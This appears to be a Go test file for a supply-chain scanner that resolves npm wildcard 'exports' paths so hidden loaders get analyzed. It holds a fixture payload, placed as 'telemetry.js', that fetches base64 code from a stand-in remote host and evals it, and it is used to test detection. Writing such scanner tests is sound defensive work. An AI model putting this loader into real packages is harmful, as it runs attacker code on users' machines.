package npm

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/securefs"
)

// D-137: D-136 resolved concrete `exports` paths but recorded wildcard subpath
// patterns as a known miss — a loader reachable only through "./f/*" was still
// invisible. This resolves them against the tree.
//
// Node's `*` in a subpath pattern matches any substring INCLUDING "/", so
// "./f/*.js" reaches "./f/deep/nested/loader.js". That is why resolution is a
// recursive walk rather than a single-directory match.

const d137Loader = `const https = require('https');
https.get('https://203.0.113.55/beacon', r => {
  let b = ''; r.on('data', d => b += d);
  r.on('end', () => eval(Buffer.from(b, 'base64').toString()));
});`

const d137Benign = "'use strict';\nmodule.exports = { a: 1 };"

func TestD137WildcardPrefixSuffix(t *testing.T) {
	cases := []struct {
		target, prefix, suffix string
		ok                     bool
	}{
		{"./src/features/*.js", "src/features/", ".js", true},
		{"./src/*", "src/", "", true},
		{"./dist/feat-*.js", "dist/feat-", ".js", true},
		{"./*.js", "", ".js", true},
		// Multiple stars: prefix before the first, suffix after the last.
		{"./src/*/index-*.js", "src/", ".js", true},
		// No star at all is not a wildcard target.
		{"./src/index.js", "", "", false},
		// Escapes are refused here as well as by the contained reader.
		{"./../*.js", "", "", false},
	}
	for _, c := range cases {
		p, s, ok := wildcardPrefixSuffix(c.target)
		if ok != c.ok || (ok && (p != c.prefix || s != c.suffix)) {
			t.Errorf("%q: got (%q,%q,%v), want (%q,%q,%v)", c.target, p, s, ok, c.prefix, c.suffix, c.ok)
		}
	}
}

func TestD137StaticDirOf(t *testing.T) {
	cases := map[string]string{
		"src/features/": "src/features",
		"dist/feat-":    "dist",
		"feat-":         "",
		"":              "",
	}
	for in, want := range cases {
		if got := staticDirOf(in); got != want {
			t.Errorf("staticDirOf(%q) = %q, want %q", in, got, want)
		}
	}
}

// d137Resolve runs the wildcard resolver directly over a fixture tree.
func d137Resolve(t *testing.T, exports string, files map[string]string) []string {
	t.Helper()
	dir := t.TempDir()
	for rel, c := range files {
		writeFile(t, dir, rel, c)
	}
	reader, err := securefs.NewReader(dir)
	if err != nil {
		t.Fatal(err)
	}
	return resolveExportsWildcards(reader, reader.Root(), json.RawMessage(exports))
}

func TestD137ResolutionShapes(t *testing.T) {
	tree := map[string]string{
		"src/features/a.js":           d137Benign,
		"src/features/b.js":           d137Benign,
		"src/features/deep/nested.js": d137Benign,
		"src/features/notes.md":       "ignore me",
		"dist/feat-one.js":            d137Benign,
		"dist/other.js":               d137Benign,
	}
	cases := []struct {
		name    string
		exports string
		want    []string
	}{
		{
			name:    "flat and nested, suffix filtered",
			exports: `{"./f/*": "./src/features/*.js"}`,
			// .md is excluded by the suffix; the nested file IS included
			// because Node's * matches across "/".
			want: []string{"src/features/a.js", "src/features/b.js", "src/features/deep/nested.js"},
		},
		{
			name:    "no suffix takes everything under the prefix",
			exports: `{"./f/*": "./src/features/*"}`,
			want: []string{
				"src/features/a.js", "src/features/b.js",
				"src/features/deep/nested.js", "src/features/notes.md",
			},
		},
		{
			name:    "partial filename prefix",
			exports: `{"./d/*": "./dist/feat-*.js"}`,
			want:    []string{"dist/feat-one.js"},
		},
		{
			name:    "directory the package does not ship",
			exports: `{"./x/*": "./missing/*.js"}`,
			want:    nil,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := d137Resolve(t, c.exports, tree)
			if strings.Join(got, ",") != strings.Join(c.want, ",") {
				t.Errorf("got %v, want %v", got, c.want)
			}
		})
	}
}

// TestD137ResolutionIsDeterministic: os.ReadDir returns entries sorted by name
// and the target list arrives sorted, so repeated resolution must not vary.
func TestD137ResolutionIsDeterministic(t *testing.T) {
	tree := map[string]string{}
	for _, n := range []string{"e", "a", "d", "b", "c"} {
		tree["src/"+n+".js"] = d137Benign
	}
	first := d137Resolve(t, `{"./s/*": "./src/*.js"}`, tree)
	if len(first) != 5 {
		t.Fatalf("expected 5, got %v", first)
	}
	for i := 0; i < 20; i++ {
		got := d137Resolve(t, `{"./s/*": "./src/*.js"}`, tree)
		if strings.Join(got, ",") != strings.Join(first, ",") {
			t.Fatalf("iteration %d: %v vs %v", i, got, first)
		}
	}
}

// TestD137SkipsNestedNodeModulesAndDotDirs: a nested node_modules holds OTHER
// packages, analyzed on their own graph nodes; dot-directories are not shipped
// code. Neither should be swept in by a broad wildcard.
func TestD137SkipsNestedNodeModulesAndDotDirs(t *testing.T) {
	got := d137Resolve(t, `{"./s/*": "./src/*.js"}`, map[string]string{
		"src/ok.js":                     d137Benign,
		"src/node_modules/dep/index.js": d137Loader,
		"src/.cache/tmp.js":             d137Loader,
	})
	for _, g := range got {
		if strings.Contains(g, "node_modules") || strings.Contains(g, "/.") {
			t.Errorf("swept in an excluded directory: %q", g)
		}
	}
	if len(got) != 1 || got[0] != "src/ok.js" {
		t.Errorf("got %v, want [src/ok.js]", got)
	}
}

// TestD137MatchCapBounded proves the match cap holds.
func TestD137MatchCapBounded(t *testing.T) {
	tree := map[string]string{}
	for i := 0; i < maxExportsWildcardMatches*2; i++ {
		tree["src/f"+itoa(i)+".js"] = d137Benign
	}
	got := d137Resolve(t, `{"./s/*": "./src/*.js"}`, tree)
	if len(got) > maxExportsWildcardMatches {
		t.Errorf("match cap breached: %d > %d", len(got), maxExportsWildcardMatches)
	}
	if len(got) == 0 {
		t.Error("expected the cap to bound the result, not empty it")
	}
}

// TestD137SymlinkEscapeRefused: the contained reader must refuse to enumerate a
// directory symlinked out of the package, so a wildcard cannot be used to reach
// and scan files outside the tree.
func TestD137SymlinkEscapeRefused(t *testing.T) {
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret.js"), []byte(d137Loader), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg := t.TempDir()
	writeFile(t, pkg, "src/ok.js", d137Benign)
	if err := os.Symlink(outside, filepath.Join(pkg, "src", "escape")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	reader, err := securefs.NewReader(pkg)
	if err != nil {
		t.Fatal(err)
	}
	got := resolveExportsWildcards(reader, reader.Root(), json.RawMessage(`{"./s/*": "./src/*.js"}`))
	for _, g := range got {
		if strings.Contains(g, "escape") || strings.Contains(g, "secret") {
			t.Errorf("followed a symlink out of the package: %q", g)
		}
	}
}

// TestD137WildcardOnlyLoaderAnalyzedEndToEnd is the regression this exists for:
// the loader is reachable ONLY through a wildcard subpath — no main, no
// conventional index.*, no concrete exports entry.
func TestD137WildcardOnlyLoaderAnalyzedEndToEnd(t *testing.T) {
	hooks := d137Hooks(t, map[string]string{
		"package.json":              `{"name":"wc-pkg","version":"1.0.0","exports":{"./features/*":"./src/features/*.js"}}`,
		"src/features/safe.js":      d137Benign,
		"src/features/telemetry.js": d137Loader,
	})
	for _, h := range hooks {
		if h == "module-load:src/features/telemetry.js" {
			return
		}
	}
	t.Errorf("expected the wildcard-reachable loader to be analyzed, got %v", hooks)
}

// TestD137BenignWildcardPackageProducesNoHook is the FP boundary: resolving a
// wildcard can pull in many files, and none of them may be flagged on the
// strength of being reachable. The load-time pass is still gated on a
// JS-precise execution signal.
func TestD137BenignWildcardPackageProducesNoHook(t *testing.T) {
	hooks := d137Hooks(t, map[string]string{
		"package.json":       `{"name":"wc-pkg","version":"1.0.0","exports":{"./f/*":"./src/*.js"}}`,
		"src/a.js":           d137Benign,
		"src/b.js":           d137Benign,
		"src/deep/nested.js": d137Benign,
	})
	if len(hooks) != 0 {
		t.Errorf("did not expect hooks for a benign wildcard package, got %v", hooks)
	}
}

func d137Hooks(t *testing.T, files map[string]string) []string {
	t.Helper()
	dir := t.TempDir()
	for rel, c := range files {
		writeFile(t, dir, rel, c)
	}
	g := graph.New()
	id := "pkg:npm/wc-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID: id, Kind: graph.KindPackage, Ecosystem: "npm",
		Name: "wc-pkg", Version: "1.0.0", Depth: 0,
		Attr: map[string]string{"npm.source": "package.json"},
	})
	g.MarkRoot(id)
	if err := (&Adapter{}).ExtractInstallSurface(dir, g); err != nil {
		t.Logf("gaps: %v", err)
	}
	var out []string
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook {
			out = append(out, n.Name)
		}
	}
	return out
}
